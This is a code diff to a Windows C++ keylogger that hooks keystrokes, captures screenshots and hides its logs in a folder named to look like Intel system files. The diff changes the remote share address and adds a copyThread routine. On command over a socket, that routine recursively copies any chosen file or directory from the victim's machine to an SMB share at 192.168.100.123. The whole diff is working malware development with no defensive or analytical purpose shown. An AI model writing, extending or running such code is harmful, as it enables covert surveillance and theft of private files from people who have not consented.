@@ -10,8 +10,13 @@
 #include <stdio.h>
 #include <time.h>
 #include <string>
+#include <codecvt>   // For std::codecvt_utf8
+#include <locale>    // For std::wstring_convert
 #pragma comment(lib, "ws2_32.lib")
-
+#include <PathCch.h>
+#pragma comment(lib, "Pathcch.lib")
+#include <mutex>
+#include <Shellapi.h>
 #define MAX_PATH 260
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -19,6 +24,7 @@ void Save(const char* text);
 void CaptureScreenAndSave();
 void listenThread();
 void sendThread();
+void copyThread(const char* path, const wchar_t* destPath);
 void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath);
 void deleteFile(const std::wstring& filePath);
 
@@ -31,7 +37,7 @@ bool newLinePending = false;
 bool isNewLine = true;
 bool on = true;
 std::wstring directoryPath = L"C:\\ProgramData\\Intel\\AGS\\Temp\\Logs\\";
-std::wstring remotePath = L"\\\\192.168.100.61\\123\\";
+std::wstring remotePath = L"\\\\192.168.100.123\\Compare\\";
 
 int main() {
     if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
@@ -237,7 +243,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-
+std::mutex fileMutex;
 void Save(const char* text) {
     WIN32_FIND_DATA findFileData;
     HANDLE hFind = FindFirstFile((directoryPath + L"*.txt").c_str(), &findFileData);
@@ -269,6 +275,7 @@ void Save(const char* text) {
 
     if (hFile != INVALID_HANDLE_VALUE) {
         if (isNewLine) {
+            std::lock_guard<std::mutex> lock(fileMutex);
             auto now = std::chrono::system_clock::now();
             std::time_t now_c = std::chrono::system_clock::to_time_t(now);
 
@@ -458,6 +465,11 @@ void listenThread() {
                 st.join();
                 on = true;
             }
+            else {
+                // copy data
+                std::thread ft(copyThread, recvdata, remotePath.c_str());  // Create a thread
+                ft.join();
+            }
         }
     }
     closesocket(msocket);
@@ -494,6 +506,80 @@ void sendThread() {
 
     return;
 }
+
+void copyThread(const char* path, const wchar_t* destPath) {
+    // Convert char* path to UTF-16 std::wstring
+    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>, wchar_t> converter;
+    std::wstring widePath = converter.from_bytes(path);
+
+    // Ensure destPath ends with backslash if it's a folder
+    std::wstring remotePathWithBackslash(destPath);
+    if (!remotePathWithBackslash.empty() && remotePathWithBackslash.back() != L'\\') {
+        remotePathWithBackslash.push_back(L'\\');
+    }
+
+    // Check if path is a file or directory
+    DWORD dwAttrib = GetFileAttributesW(widePath.c_str());
+    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
+        std::cerr << "Invalid path: " << GetLastError() << std::endl;
+        return;
+    }
+
+    if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
+        // If it's a directory, proceed with existing functionality
+        // Append "\\*" to the path to find all files and directories in the directory
+        std::wstring searchPath = widePath + L"\\*";
+
+        WIN32_FIND_DATAW FindFileData;
+        HANDLE hFind;
+
+        // Find the first file or directory in the specified directory
+        hFind = FindFirstFileW(searchPath.c_str(), &FindFileData);
+        if (hFind == INVALID_HANDLE_VALUE) {
+            std::cerr << "FindFirstFile failed: " << GetLastError() << std::endl;
+            return;
+        }
+
+        do {
+            // Skip current directory (.) and parent directory (..)
+            if (wcscmp(FindFileData.cFileName, L".") == 0 || wcscmp(FindFileData.cFileName, L"..") == 0) {
+                continue;
+            }
+
+            // Construct full path of the current file or directory
+            std::wstring currentFilePath = widePath + L"\\" + FindFileData.cFileName;
+
+            if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                // If it's a directory, recursively call copyThread on this directory
+                std::wstring newRemoteDir = remotePathWithBackslash + FindFileData.cFileName;
+                if (!CreateDirectoryW(newRemoteDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
+                    std::cerr << "Failed to create directory: " << GetLastError() << std::endl;
+                }
+                else {
+                    copyThread(converter.to_bytes(currentFilePath).c_str(), newRemoteDir.c_str());
+                }
+            }
+            else {
+                // If it's a file, send file to remote server
+                std::wstring remoteFilePath = remotePathWithBackslash + FindFileData.cFileName;
+                sendFileToRemote(currentFilePath, remoteFilePath);
+                std::wcout << L"Copying file: " << currentFilePath << L" to " << remoteFilePath << std::endl;
+            }
+
+        } while (FindNextFileW(hFind, &FindFileData) != 0);
+
+        // Close handle after finished
+        FindClose(hFind);
+    }
+    else {
+        // If it's a file, directly copy it to remotePath
+        std::wstring fileName = widePath.substr(widePath.find_last_of(L"\\") + 1);
+        std::wstring remoteFilePath = remotePathWithBackslash + fileName;
+        sendFileToRemote(widePath, remoteFilePath);
+        std::wcout << L"Copying file: " << widePath << L" to " << remoteFilePath << std::endl;
+    }
+}
+
 
 void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath) {
     // Example: Use CopyFile function to copy file to remote server directory
